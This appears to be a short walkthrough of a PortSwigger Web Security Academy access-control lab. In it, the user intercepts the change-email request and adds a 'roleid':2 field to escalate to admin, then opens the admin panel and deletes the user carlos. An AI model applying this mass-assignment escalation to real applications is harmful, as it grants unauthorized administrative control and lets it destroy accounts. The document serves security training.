# Lab: User role can be modified in user profile
# https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile

```bash
# Login as wiener, change your mail to a@gmail.com.
# Open HTTP history and check change-email request's response:

{
  "username": "wiener",
  "email": "a@gmail.com",
  "apikey": "sjtxW6UIbSxvOj0Ip3vwUuZBoE0ie9bz",
  "roleid": 1
}
```


```bash
# Turn Intercept on, put abc@gmail.com as mail and click on update email.

{
"email":"abc@gmail.com",
"roleid":2

}
# Forward the request and close interception.

# Visit https://0aa800ec032d70ce85ef4ace00b5008e.web-security-academy.net/admin

# Delete Carlos.
```
